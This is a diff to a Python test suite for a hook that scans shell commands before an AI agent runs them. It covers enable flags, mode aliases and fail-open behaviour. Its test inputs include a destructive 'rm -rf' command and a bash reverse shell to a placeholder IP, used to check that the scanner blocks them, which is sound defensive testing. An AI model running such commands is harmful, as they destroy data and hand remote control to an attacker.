@@ -194,6 +194,33 @@ def test_empty_or_non_string_command_fails_open(mock_cli) -> None:
     assert not capture.exists()
 
 
+def test_hook_enabled_false_skips_scan(mock_cli) -> None:
+    env, capture = mock_cli(
+        output=_DENY_RESULT,
+        extra={"CODE_SCANNER_HOOK_ENABLED": "false", "CODE_SCANNER_MODE": "deny"},
+    )
+
+    proc = _run_hook(_pre_tool_input("rm -rf /secret/path"), env)
+
+    assert _stdout_json(proc) == {}
+    assert proc.stderr == ""
+    assert not capture.exists()
+
+
+def test_invalid_hook_enabled_value_defaults_to_enabled_silently(mock_cli) -> None:
+    env, capture = mock_cli(
+        output=_DENY_RESULT,
+        extra={"CODE_SCANNER_HOOK_ENABLED": "maybe"},
+    )
+
+    proc = _run_hook(_pre_tool_input("rm -rf /secret/path"), env)
+
+    assert _stdout_json(proc) == {}
+    assert proc.stderr == ""
+    captured = _captured_call(capture)
+    assert "scan-code" in captured["argv"]
+
+
 def test_observe_mode_scans_and_allows_with_empty_output(mock_cli) -> None:
     env, capture = mock_cli(output=_DENY_RESULT)
 
@@ -206,11 +233,24 @@ def test_observe_mode_scans_and_allows_with_empty_output(mock_cli) -> None:
     assert captured["argv"][captured["argv"].index("--language") + 1] == "bash"
 
 
-def test_deny_mode_pass_and_error_verdicts_allow(mock_cli) -> None:
+def test_debug_alias_scans_and_allows_silently(mock_cli) -> None:
+    env, capture = mock_cli(
+        output=_DENY_RESULT,
+        extra={"CODE_SCANNER_MODE": "debug"},
+    )
+
+    proc = _run_hook(_pre_tool_input("rm -rf /secret/path"), env)
+
+    assert _stdout_json(proc) == {}
+    assert proc.stderr == ""
+    assert capture.exists()
+
+
+def test_block_mode_pass_and_error_verdicts_allow(mock_cli) -> None:
     for result in (_PASS_RESULT, _ERROR_RESULT):
         env, _capture = mock_cli(
             output=result,
-            extra={"CODE_SCANNER_MODE": "deny"},
+            extra={"CODE_SCANNER_MODE": "block"},
         )
 
         proc = _run_hook(_pre_tool_input("echo hello"), env)
@@ -238,11 +278,11 @@ def test_ask_mode_warn_requests_pre_tool_approval(mock_cli) -> None:
     assert raw_command not in proc.stderr
 
 
-def test_deny_mode_warn_blocks_with_pre_tool_decision(mock_cli) -> None:
+def test_block_mode_warn_blocks_with_pre_tool_decision(mock_cli) -> None:
     raw_command = "rm -rf /secret/path"
     env, _capture = mock_cli(
         output=_WARN_RESULT,
-        extra={"CODE_SCANNER_MODE": "deny"},
+        extra={"CODE_SCANNER_MODE": "block"},
     )
 
     proc = _run_hook(_pre_tool_input(raw_command), env)
@@ -258,7 +298,7 @@ def test_deny_mode_warn_blocks_with_pre_tool_decision(mock_cli) -> None:
     assert raw_command not in proc.stderr
 
 
-def test_deny_mode_deny_blocks_with_english_description(mock_cli) -> None:
+def test_deny_alias_blocks_with_english_description(mock_cli) -> None:
     raw_command = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
     env, _capture = mock_cli(
         output=_DENY_RESULT,
@@ -339,7 +379,7 @@ def test_cli_failure_and_invalid_json_fail_open(mock_cli) -> None:
         assert "rm -rf /secret/path" not in proc.stderr
 
 
-def test_invalid_mode_warns_and_fails_open_without_scanning(mock_cli) -> None:
+def test_invalid_mode_writes_diagnostic_and_is_equivalent_to_unset(mock_cli) -> None:
     env, capture = mock_cli(
         output=_DENY_RESULT,
         extra={"CODE_SCANNER_MODE": "banana"},
@@ -347,7 +387,8 @@ def test_invalid_mode_warns_and_fails_open_without_scanning(mock_cli) -> None:
 
     proc = _run_hook(_pre_tool_input("rm -rf /secret/path"), env)
 
-    output = _stdout_json(proc)
-    assert "decision" not in output
-    assert "Invalid CODE_SCANNER_MODE" in output["systemMessage"]
-    assert not capture.exists()
+    assert _stdout_json(proc) == {}
+    assert "CODE_SCANNER_MODE" in proc.stderr
+    assert "banana" in proc.stderr
+    assert "rm -rf /secret/path" not in proc.stderr
+    assert capture.exists()
